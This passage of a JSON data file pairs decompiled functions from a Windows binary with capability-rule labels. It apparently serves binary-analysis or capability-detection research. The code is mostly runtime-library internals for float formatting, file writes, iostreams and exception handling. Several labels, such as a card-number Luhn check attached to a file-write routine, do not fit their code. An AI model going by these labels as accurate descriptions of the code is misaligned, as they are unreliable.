0;\n    }\n    pcVar11 = arg_ch + 2;\n    if (arg_1ch == 0) {\n        cVar1 = uVar9;\n    }\n    else {\n        if (*(arg_2ch + 0x14) == '\\0') {\n            fcn.0040d4a0();\n        }\n        uVar9 = 0;\n        cVar1 = ***(*(arg_2ch + 0xc) + 0x88);\n    }\n    *pcVar7 = cVar1;\n    if (((arg_8h[1] & 0xfffff) != 0) || (uVar9 <= *arg_8h && *arg_8h != uVar9)) {\n        uVar5 = 0x30;\n        var_18h = 0xf0000;\n        do {\n            if (arg_1ch < 1) {\n                cVar1 = fcn.00414f96(arg_8h, uVar9, var_18h, uVar5, arg_28h);\n                pcVar12 = pcVar11;\n                if (cVar1 != '\\0') {\n                    while( true ) {\n                        pcVar8 = pcVar12 + -1;\n                        cVar1 = *pcVar8;\n                        if ((cVar1 != 'f') && (cVar1 != 'F')) break;\n                        *pcVar8 = '0';\n                        pcVar12 = pcVar8;\n                    }\n                    if (pcVar8 == pcVar7) {\n                        pcVar12[-2] = pcVar12[-2] + '\\x01';\n                    }\n                    else {\n                        if (cVar1 == '9') {\n                            cVar1 = iVar2 + ':';\n                        }\n                        else {\n                            cVar1 = cVar1 + '\\x01';\n                        }\n                        *pcVar8 = cVar1;\n                    }\n                }\n                break;\n            }\n            iVar3 = fcn.00422e70();\n            uVar4 = iVar3 + 0x30;\n            if (0x39 < uVar4) {\n                uVar4 = uVar4 + iVar2;\n            }\n            uVar9 = uVar9 >> 4 | var_18h << 0x1c;\n            *pcVar11 = uVar4;\n            pcVar11 = pcVar11 + 1;\n            var_18h = var_18h >> 4;\n            uVar5 = uVar5 - 4;\n            arg_1ch = arg_1ch + -1;\n        } while (-1 < uVar5);\n    }\n    if (0 < arg_1ch) {\n        fcn.004085e0(pcVar11, 0x30, arg_1ch);\n        pcVar11 = pcVar11 + arg_1ch;\n    }\n    if (*pcVar7 == '\\0') {\n        pcVar11 = pcVar7;\n    }\n    *pcVar11 = (arg_20h ^ 1) * ' ' + 'P';\n    uVar9 = fcn.00422e70();\n    pcVar7 = pcVar11 + 2;\n    uVar10 = (uVar9 & 0x7ff) - var_10h;\n    uVar9 = (uVar9 & 0x7ff) < var_10h;\n    iVar6 = -uVar9;\n    if (uVar9 == 0) {\n        cVar1 = '+';\n    }\n    else {\n        bVar13 = uVar10 != 0;\n        uVar10 = -uVar10;\n        iVar6 = -(iVar6 + bVar13);\n        cVar1 = '-';\n    }\n    pcVar11[1] = cVar1;\n    *pcVar7 = '0';\n    pcVar12 = pcVar7;\n    if (iVar6 < 0) {\ncode_r0x00414a5e:\n        if ((iVar6 < 0) || ((iVar6 < 1 && (uVar10 < 10)))) goto code_r0x00414a83;\n    }\n    else {\n        if ((iVar6 < 1) && (uVar10 < 1000)) {\ncode_r0x00414a2d:\n            if ((iVar6 < 0) || ((iVar6 < 1 && (uVar10 < 100)))) goto code_r0x00414a5e;\n        }\n        else {\n            cVar1 = fcn.00422e90(uVar10, iVar6, 1000, 0, 0);\n            iVar6 = 0;\n            pcVar12 = pcVar11 + 3;\n            *pcVar7 = cVar1 + '0';\n            uVar10 = extraout_ECX;\n            if (pcVar12 == pcVar7) goto code_r0x00414a2d;\n        }\n        cVar1 = fcn.00422e90(uVar10, iVar6, 100, 0, 0);\n        iVar6 = 0;\n        *pcVar12 = cVar1 + '0';\n        pcVar12 = pcVar12 + 1;\n        uVar10 = extraout_ECX_00;\n        if (pcVar12 == pcVar7) goto code_r0x00414a5e;\n    }\n    cVar1 = fcn.00422e90(uVar10, iVar6, 10, 0, 0);\n    *pcVar12 = cVar1 + '0';\n    pcVar12 = pcVar12 + 1;\n    uVar10 = extraout_ECX_01;\ncode_r0x00414a83:\n    *pcVar12 = uVar10 + '0';\n    pcVar12[1] = '\\0';\n    return 0;\n}\n",
        "token_count": 2101
    },
    "004179a4": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004179a4(uint32_t arg_8h, char *arg_ch, uint32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint var_30h;\n    int32_t var_2ch;\n    uint lpNumberOfBytesWritten;\n    uint uStack40;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint32_t nNumberOfBytesToWrite;\n    char *lpBuffer;\n    uint var_1h;\n    \n    lpBuffer = arg_ch;\n    nNumberOfBytesToWrite = arg_10h;\n    if (arg_10h == 0) {\n        return 0;\n    }\n    if (arg_ch == NULL) {\ncode_r0x004179cd:\n        *(arg_14h + 0x24) = 1;\n        *(arg_14h + 0x20) = 0;\n        *(arg_14h + 0x1c) = 1;\n        *(arg_14h + 0x18) = 0x16;\n        fcn.0040b7a2(0, 0, 0, 0, 0, arg_14h);\n        return -1;\n    }\n    var_10h = arg_8h >> 6;\n    var_14h = (arg_8h & 0x3f) * 0x38;\n    iVar3 = *(var_10h * 4 + 0x48fb00);\n    var_1h._0_1_ = *(var_14h + 0x29 + iVar3);\n    if (((var_1h == '\\x02') || (var_1h == '\\x01')) && ((~arg_10h & 1) == 0)) goto code_r0x004179cd;\n    if ((*(var_14h + 0x28 + iVar3) & 0x20) != 0) {\n        fcn.00419182(arg_8h, 0, 0, 2, arg_14h);\n    }\n    cVar1 = fcn.00417528(arg_8h, arg_14h);\n    if (cVar1 == '\\0') {\n        iVar3 = *(var_10h * 4 + 0x48fb00);\n        if (*(var_14h + 0x28 + iVar3) < '\\0') {\n            if (var_1h == '\\0') {\n                piVar2 = fcn.004175a6(&var_2ch, arg_8h, lpBuffer, nNumberOfBytesToWrite);\n            }\n            else if (var_1h == '\\x01') {\n                piVar2 = fcn.0041776a(&var_2ch, arg_8h, lpBuffer, nNumberOfBytesToWrite);\n            }\n            else {\n                if (var_1h != '\\x02') goto code_r0x00417b65;\n                piVar2 = fcn.00417681(&var_2ch, arg_8h, lpBuffer, nNumberOfBytesToWrite);\n            }\n        }\n        else {\n            var_2ch = 0;\n            lpNumberOfBytesWritten = 0;\n            uStack40 = 0;\n            iVar3 = (*_sym.imp.KERNEL32.dll_WriteFile)\n                              (*(var_14h + 0x18 + iVar3), lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n            if (iVar3 == 0) {\n                var_2ch = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            piVar2 = &var_2ch;\n        }\n    }\n    else if (var_1h == '\\0') {\n        piVar2 = fcn.004170ee(&var_2ch, arg_8h, lpBuffer, nNumberOfBytesToWrite, arg_14h);\n    }\n    else {\n        if (1 < var_1h - 1U) goto code_r0x00417b65;\n        piVar2 = fcn.004174c0(&var_2ch, lpBuffer, nNumberOfBytesToWrite);\n    }\n    var_20h = *piVar2;\n    var_1ch = piVar2[1];\n    var_18h = piVar2[2];\n    if (var_1ch != 0) {\n        return var_1ch - var_18h;\n    }\n    if (var_20h != 0) {\n        if (var_20h == 5) {\n            *(arg_14h + 0x1c) = 1;\n            *(arg_14h + 0x18) = 9;\n            *(arg_14h + 0x24) = 1;\n            *(arg_14h + 0x20) = 5;\n            return -1;\n        }\n        fcn.0040e0b7(var_20h, arg_14h);\n        return -1;\n    }\ncode_r0x00417b65:\n    if (((*(var_14h + 0x28 + *(var_10h * 4 + 0x48fb00)) & 0x40) != 0) && (*lpBuffer == '\\x1a')) {\n        return 0;\n    }\n    *(arg_14h + 0x1c) = 1;\n    *(arg_14h + 0x18) = 0x1c;\n    *(arg_14h + 0x24) = 1;\n    *(arg_14h + 0x20) = 0;\n    return -1;\n}\n",
        "token_count": 1314
    },
    "00403180": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403180(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x4234d0;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    var_4h = 0;\n    iVar1 = *(*param_1 + 4);\n    if ((*(iVar1 + 0xc + param_1) == 0) && ((*(iVar1 + 0x14 + param_1) & 2) != 0)) {\n        iVar1 = (**(**(iVar1 + 0x38 + param_1) + 0x34))();\n        if (iVar1 == -1) {\n            fcn.00404a30(4, 0);\n        }\n    }\n    *in_FS_OFFSET = var_ch_2;\n    return;\n}\n",
        "token_count": 239
    },
    "00403210": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint * fcn.00403210(uint param_1, uint *param_2, uint param_3, int32_t *param_4, uint8_t *param_5, int32_t param_6)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    \n    if (param_6 != 0) {\n        do {\n            if (param_4 == NULL) {\ncode_r0x00403269:\n                param_3 = CONCAT31(param_3._1_3_, 1);\n            }\n            else {\n                uVar1 = *param_5;\n                if (*param_4[8] == 0) {\ncode_r0x00403253:\n                    uVar4 = (**(*param_4 + 0xc))(uVar1);\n                }\n                else {\n                    iVar2 = *param_4[0xc];\n                    if (iVar2 < 1) goto code_r0x00403253;\n                    *param_4[0xc] = iVar2 + -1;\n                    puVar3 = *param_4[8];\n                    *param_4[8] = puVar3 + 1;\n                    *puVar3 = uVar1;\n                    uVar4 = uVar1;\n                }\n                if (uVar4 == 0xffffffff) goto code_r0x00403269;\n            }\n            param_5 = param_5 + 1;\n            param_6 = param_6 + -1;\n        } while (param_6 != 0);\n    }\n    param_2[1] = param_4;\n    *param_2 = param_3;\n    return param_2;\n}\n",
        "token_count": 376
    },
    "00403290": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint * fcn.00403290(uint param_1, uint *param_2, uint param_3, int32_t *param_4, uint8_t param_5, int32_t param_6)\n\n{\n    int32_t iVar1;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    \n    if (param_6 != 0) {\n        do {\n            if (param_4 == NULL) {\ncode_r0x004032e6:\n                param_3 = CONCAT31(param_3._1_3_, 1);\n            }\n            else {\n                if (*param_4[8] == 0) {\ncode_r0x004032d0:\n                    uVar3 = (**(*param_4 + 0xc))(param_5);\n                }\n                else {\n                    iVar1 = *param_4[0xc];\n                    if (iVar1 < 1) goto code_r0x004032d0;\n                    *param_4[0xc] = iVar1 + -1;\n                    puVar2 = *param_4[8];\n                    *param_4[8] = puVar2 + 1;\n                    *puVar2 = param_5;\n                    uVar3 = param_5;\n                }\n                if (uVar3 == 0xffffffff) goto code_r0x004032e6;\n            }\n            param_6 = param_6 + -1;\n        } while (param_6 != 0);\n    }\n    param_2[1] = param_4;\n    *param_2 = param_3;\n    return param_2;\n}\n",
        "token_count": 349
    },
    "004048b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __thiscall fcn.004048b0(int32_t *param_1, uint param_2)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    uint32_t uVar8;\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t uStack72;\n    uint var_34h;\n    int32_t *var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    int32_t *var_14h;\n    uint32_t *puStack20;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x423520;\n    var_ch_2 = *in_FS_OFFSET;\n    uStack72 = *0x48e22c ^ &stack0xfffffffc;\n    puStack20 = &uStack72;\n    *in_FS_OFFSET = &var_ch_2;\n    uVar8 = 0;\n    var_18h = 0;\n    var_14h = param_1;\n    fcn.00401d30(param_1);\n    if (var_1ch == '\\0') {\n        uVar8 = 4;\n    }\n    else {\n        var_4h = 0;\n        iVar3 = fcn.00404a60(var_8h);\n        if (iVar3 == -1) {\n            uVar8 = 4;\n        }\n        var_4h = 0xffffffff;\n        var_18h = uVar8;\n    }\n    uVar6 = 4;\n    iVar3 = *(*param_1 + 4);\n    if (*(param_1 + iVar3 + 0x38) != 0) {\n        uVar6 = 0;\n    }\n    uVar8 = uVar6 | *(param_1 + iVar3 + 0xc) & 0x17 | uVar8;\n    *(param_1 + iVar3 + 0xc) = uVar8;\n    uVar8 = *(param_1 + iVar3 + 0x10) & uVar8;\n    if (uVar8 == 0) {\n        cVar2 = fcn.00404da8();\n        if (cVar2 == '\\0') {\n            fcn.00403180();\n        }\n        piVar5 = *(*(*var_20h + 4) + 0x38 + var_20h);\n        if (piVar5 != NULL) {\n            (**(*piVar5 + 8))();\n        }\n        *in_FS_OFFSET = var_ch_2;\n        return param_1;\n    }\n    if ((uVar8 & 4) == 0) {\n        pcVar7 = \"ios_base::failbit set\";\n        if ((uVar8 & 2) == 0) {\n            pcVar7 = \"ios_base::eofbit set\";\n        }\n    }\n    else {\n        pcVar7 = \"ios_base::badbit set\";\n    }\n    uVar4 = fcn.00404800(&var_20h, 1);\n    fcn.00401c60(pcVar7, uVar4);\n    fcn.00407c30(&var_34h, 0x430780);\n    pcVar1 = swi(3);\n    piVar5 = (*pcVar1)();\n    return piVar5;\n}\n",
        "token_count": 808
    },
    "004055ab": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004055ab(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004072c2(8);\n    fcn.00404b8c(0);\n    piVar1 = *0x48f2fc;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00405851();\n    iVar3 = fcn.00405c09(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.00405ba1(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00405e0d();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00404f41(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x424130)();\n        (*pcVar2)();\n        *0x48f2fc = piVar1;\n    }\n    fcn.00404be4();\n    fcn.0040729f();\n    return;\n}\n",
        "token_count": 423
    },
    "null": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl method.std::basic_filebuf_char__struct_std::char_traits_char__.virtual_16(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    \n    uVar1 = **(in_ECX + 0x1c);\n    if (((uVar1 != 0) && (**(in_ECX + 0xc) < uVar1)) && ((arg_8h == 0xffffffff || (*(uVar1 - 1) == arg_8h)))) {\n        **(in_ECX + 0x2c) = **(in_ECX + 0x2c) + 1;\n        **(in_ECX + 0x1c) = **(in_ECX + 0x1c) + -1;\n        return -(arg_8h != 0xffffffff) & arg_8h;\n    }\n    if ((*(in_ECX + 0x4c) != 0) && (arg_8h != 0xffffffff)) {\n        if ((*(in_ECX + 0x38) == 0) && (iVar2 = fcn.0040f6ec(arg_8h & 0xff, *(in_ECX + 0x4c)),  iVar2 != -1)) {\n            return arg_8h;\n        }\n        if (**(in_ECX + 0x1c) != in_ECX + 0x3c) {\n            *(in_ECX + 0x3c) = arg_8h;\n            fcn.00405dd0();\n            return arg_8h;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 374
    },
    "004066b1": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.004066b1(uchar *arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t **var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = arg_10h;\n    uVar5 = arg_ch;\n    if ((-1 < arg_10h) && ((0 < arg_10h || (arg_ch != 0)))) {\n        do {\n            if (*in_ECX[7] == 0) {\n                uVar4 = 0;\n            }\n            else {\n                uVar4 = *in_ECX[0xb];\n            }\n            var_ch = in_ECX + 0xb;\n            var_8h = uVar4 >> 0x1f;\n            if ((var_8h < 0) || ((-1 < uVar4 || var_8h < 0 && (uVar4 == 0)))) {\n                pcVar1 = *(*in_ECX + 0x1c);\n                (**0x424130)();\n                iVar2 = (*pcVar1)();\n                if (iVar2 == -1) break;\n                bVar6 = uVar5 != 0;\n                uVar5 = uVar5 - 1;\n                iVar3 = iVar3 + -1 + bVar6;\n                uVar4 = 1;\n                *arg_8h = iVar2;\n            }\n            else {\n                if ((iVar3 <= var_8h) && ((iVar3 < var_8h || (uVar5 < uVar4)))) {\n                    uVar4 = uVar5;\n                    var_8h = iVar3;\n                }\n                fcn.00408060(arg_8h, *in_ECX[7], uVar4);\n                bVar6 = uVar5 < uVar4;\n                uVar5 = uVar5 - uVar4;\n                iVar3 = (iVar3 - var_8h) - bVar6;\n                **var_ch = **var_ch - uVar4;\n                *in_ECX[7] = *in_ECX[7] + uVar4;\n            }\n            arg_8h = arg_8h + uVar4;\n            if ((iVar3 < 1) && ((iVar3 < 0 || (uVar5 == 0)))) break;\n        } while( true );\n    }\n    return CONCAT44((arg_10h - iVar3) - (arg_ch < uVar5), arg_ch - uVar5);\n}\n",
        "token_count": 625
    },
    "00406885": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00406885(uchar *arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t **var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = arg_10h;\n    uVar5 = arg_ch;\n    if ((-1 < arg_10h) && ((0 < arg_10h || (arg_ch != 0)))) {\n        do {\n            if (*in_ECX[8] == 0) {\n                uVar4 = 0;\n            }\n            else {\n                uVar4 = *in_ECX[0xc];\n            }\n            var_ch = in_ECX + 0xc;\n            var_8h = uVar4 >> 0x1f;\n            if ((var_8h < 0) || ((-1 < uVar4 || var_8h < 0 && (uVar4 == 0)))) {\n                pcVar1 = *(*in_ECX + 0xc);\n                (**0x424130)(*arg_8h);\n                iVar2 = (*pcVar1)();\n                if (iVar2 == -1) break;\n                bVar6 = uVar5 != 0;\n                uVar5 = uVar5 - 1;\n                iVar3 = iVar3 + -1 + bVar6;\n                uVar4 = 1;\n            }\n            else {\n                if ((iVar3 <= var_8h) && ((iVar3 < var_8h || (uVar5 < uVar4)))) {\n                    uVar4 = uVar5;\n                    var_8h = iVar3;\n                }\n                fcn.00408060(*in_ECX[8], arg_8h, uVar4);\n                bVar6 = uVar5 < uVar4;\n                uVar5 = uVar5 - uVar4;\n                iVar3 = (iVar3 - var_8h) - bVar6;\n                **var_ch = **var_ch - uVar4;\n                *in_ECX[8] = *in_ECX[8] + uVar4;\n            }\n            arg_8h = arg_8h + uVar4;\n            if ((iVar3 < 1) && ((iVar3 < 0 || (uVar5 == 0)))) break;\n        } while( true );\n    }\n    return CONCAT44((arg_10h - iVar3) - (arg_ch < uVar5), arg_ch - uVar5);\n}\n",
        "token_count": 617
    },
    "0040a538": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0040a538(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint32_t *arg_18h, uint arg_1ch, \n            int32_t arg_20h, int32_t arg_24h)\n\n{\n    code *pcVar1;\n    uint32_t *puVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint arg_8h_00;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *puVar7;\n    int32_t *piVar8;\n    int32_t var_64h;\n    int32_t var_60h;\n    int32_t var_58h;\n    uint *var_54h;\n    uint var_50h;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    int32_t *var_40h;\n    uint32_t *var_3ch;\n    uint32_t *var_34h;\n    uint32_t *var_30h;\n    uint var_2ch;\n    int32_t *var_28h;\n    int32_t var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint *var_14h;\n    int32_t var_10h;\n    uint32_t *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_10h = 0;\n    var_18h = var_18h & 0xffffff00;\n    var_8h = fcn.0040b4b0(arg_ch, arg_14h, arg_18h);\n    if ((var_8h < -1) || (arg_18h[1] <= var_8h)) goto code_r0x0040a8d7;\n    if (((*arg_8h != -0x1f928c9d) || (arg_8h[4] != 3)) ||\n       ((((arg_8h[5] != 0x19930520 && (arg_8h[5] != 0x19930521)) && (arg_8h[5] != 0x19930522)) || (arg_8h[7] != 0)))) {\n        var_4h = arg_10h;\n        goto code_r0x0040a686;\n    }\n    iVar4 = fcn.0040a1bc();\n    if (*(iVar4 + 0x10) == 0) {\n        return;\n    }\n    iVar4 = fcn.0040a1bc();\n    arg_8h = *(iVar4 + 0x10);\n    iVar4 = fcn.0040a1bc();\n    var_18h = CONCAT31(var_18h._1_3_, 1);\n    var_4h = *(iVar4 + 0x14);\n    if ((arg_8h == NULL) ||\n       ((((*arg_8h == -0x1f928c9d && (arg_8h[4] == 3)) &&\n         ((arg_8h[5] == 0x19930520 || ((arg_8h[5] == 0x19930521 || (arg_8h[5] == 0x19930522)))))) && (arg_8h[7] == 0))))\n    goto code_r0x0040a8d7;\n    iVar4 = fcn.0040a1bc();\n    if (*(iVar4 + 0x1c) == 0) {\ncode_r0x0040a686:\n        var_30h = arg_18h;\n        var_2ch = 0;\n        if (((*arg_8h == -0x1f928c9d) && (arg_8h[4] == 3)) &&\n           ((arg_8h[5] == 0x19930520 || ((arg_8h[5] == 0x19930521 || (arg_8h[5] == 0x19930522)))))) {\n            if (arg_18h[3] != 0) {\n                fcn.00407c9c(&var_40h, &var_30h, var_8h, arg_14h, arg_18h, arg_20h);\n                var_28h = var_40h;\n                var_ch = var_3ch;\n                if (var_3ch < var_34h) {\n                    var_1ch = var_3ch * 0x14;\n                    do {\n                        iVar4 = var_8h;\n                        puVar6 = *(*var_28h + 0x10) + var_1ch;\n                        puVar7 = &var_64h;\n                        var_ch = var_3ch;\n                        for (iVar5 = 5; iVar5 != 0; iVar5 = iVar5 + -1) {\n                            *puVar7 = *puVar6;\n                            puVar6 = puVar6 + 1;\n                            puVar7 = puVar7 + 1;\n                        }\n                        if (((var_64h <= iVar4) && (iVar4 <= var_60h)) && (var_10h = 0,  var_58h != 0)) {\n                            iVar4 = arg_8h[7];\n                            var_24h = **(iVar4 + 0xc);\n                            var_20h = *(iVar4 + 0xc) + 1;\n                            var_14h = var_54h;\n                            do {\n                                var_50h = *var_14h;\n                                uStack80 = var_14h[1];\n                                uStack76 = var_14h[2];\n                                uStack72 = var_14h[3];\n                                piVar8 = var_20h;\n                                var_3ch = var_ch;\n                                for (iVar5 = var_24h; var_ch = var_3ch,  0 < iVar5; iVar5 = iVar5 + -1) {\n                                    iVar4 = fcn.0040aa13(&var_50h, *piVar8, iVar4);\n                                    if (iVar4 != 0) {\n                                        fcn.0040a4b8(arg_8h, arg_ch, var_4h, arg_14h, arg_18h, &var_50h, *piVar8, \n                                                     &var_64h, arg_20h, arg_24h);\n                                        var_3ch = var_ch;\n                                        goto code_r0x0040a7c1;\n                                    }\n                                    iVar4 = arg_8h[7];\n                                    piVar8 = piVar8 + 1;\n                                    var_3ch = var_ch;\n                                }\n                                var_10h = var_10h + 1;\n                                var_14h = var_14h + 4;\n                            } while (var_10h != var_58h);\n                        }\ncode_r0x0040a7c1:\n                        var_3ch = var_3ch + 1;\n                        var_1ch = var_1ch + 0x14;\n                        var_ch = var_3ch;\n                    } while (var_3ch < var_34h);\n                }\n            }\n            if (arg_1ch != '\\0') {\n                fcn.0040874e(arg_8h);\n            }\n            if (0x19930520 < (*arg_18h & 0x1fffffff)) {\n                if (arg_18h[7] != 0) {\n                    if ((arg_18h[8] >> 2 & 1) != 0) goto code_r0x0040a81a;\n                    cVar3 = fcn.0040af56(arg_8h, arg_18h[7]);\n                    if (cVar3 != '\\0') goto code_r0x0040a866;\n                    goto code_r0x0040a89b;\n                }\n                if (((arg_18h[8] >> 2 & 1) != 0) && (arg_20h == 0)) {\ncode_r0x0040a81a:\n                    iVar4 = fcn.0040a1bc();\n                    *(iVar4 + 0x10) = arg_8h;\n                    iVar4 = fcn.0040a1bc();\n                    *(iVar4 + 0x14) = var_4h;\n                    goto code_r0x0040a876;\n                }\n            }\n        }\n        else if (arg_18h[3] != 0) {\n            if (arg_1ch != '\\0') goto code_r0x0040a8d7;\n            fcn.0040a8dd(arg_8h, arg_ch, var_4h, arg_14h, arg_18h, var_8h, arg_20h, arg_24h);\n        }\ncode_r0x0040a866:\n        iVar4 = fcn.0040a1bc();\n        if (*(iVar4 + 0x1c) == 0) {\n            return;\n        }\n    }\n    else {\n        iVar4 = fcn.0040a1bc();\n        var_ch = *(iVar4 + 0x1c);\n        iVar4 = fcn.0040a1bc();\n        *(iVar4 + 0x1c) = 0;\n        cVar3 = fcn.0040af56(arg_8h, var_ch);\n        puVar2 = var_ch;\n        if (cVar3 != '\\0') goto code_r0x0040a686;\n        arg_24h = 0;\n        arg_18h = puVar2;\n        if (0 < *var_ch) {\n            do {\n                cVar3 = fcn.0040abdf(0x48edf0);\n                if (cVar3 != '\\0') goto code_r0x0040a87b;\n                arg_24h = arg_24h + 0x10;\n                var_10h = var_10h + 1;\n            } while (var_10h < *puVar2);\n        }\ncode_r0x0040a876:\n        fcn.00412d0e();\ncode_r0x0040a87b:\n        fcn.0040874e(arg_8h);\n        fcn.0040abc7();\n        fcn.00407c30(&var_3ch, 0x430b64);\ncode_r0x0040a89b:\n        iVar4 = fcn.0040a1bc();\n        *(iVar4 + 0x10) = arg_8h;\n        iVar4 = fcn.0040a1bc();\n        *(iVar4 + 0x14) = var_4h;\n        if (arg_24h == 0) {\n            arg_24h = arg_ch;\n        }\n        fcn.00407e8f(arg_24h, arg_8h);\n        fcn.0040ae56(arg_ch, arg_14h, arg_18h);\n        arg_8h_00 = fcn.0040b013(arg_18h);\n        fcn.0040adcd(arg_8h_00);\n    }\ncode_r0x0040a8d7:\n    fcn.0040fec9();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 2530
    },
    "0040ae6e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0040ae6e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint arg_10h_00;\n    code *pcVar2;\n    int32_t arg_10h_01;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00407b00(0x430a80, 0x10);\n    arg_10h_01 = fcn.0040b4b0(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n    *(unaff_EBP + -0x1c) = arg_10h_01;\n    iVar3 = fcn.0040a1bc();\n    *(iVar3 + 0x18) = *(iVar3 + 0x18) + 1;\n    *(unaff_EBP + -4) = 0;\n    while (arg_10h_01 != *(unaff_EBP + 0x14)) {\n        if ((arg_10h_01 < 0) || (iVar3 = *(unaff_EBP + 0x10),  *(iVar3 + 4) <= arg_10h_01)) goto code_r0x0040af50;\n        iVar1 = *(iVar3 + 8);\n        arg_10h_00 = *(iVar1 + arg_10h_01 * 8);\n        *(unaff_EBP + -0x20) = arg_10h_00;\n        *(unaff_EBP + -4) = 1;\n        if (*(iVar1 + 4 + arg_10h_01 * 8) != 0) {\n            fcn.0040b4cd(*(unaff_EBP + 8), iVar3, arg_10h_00);\n            fcn.0040b020(*(*(iVar3 + 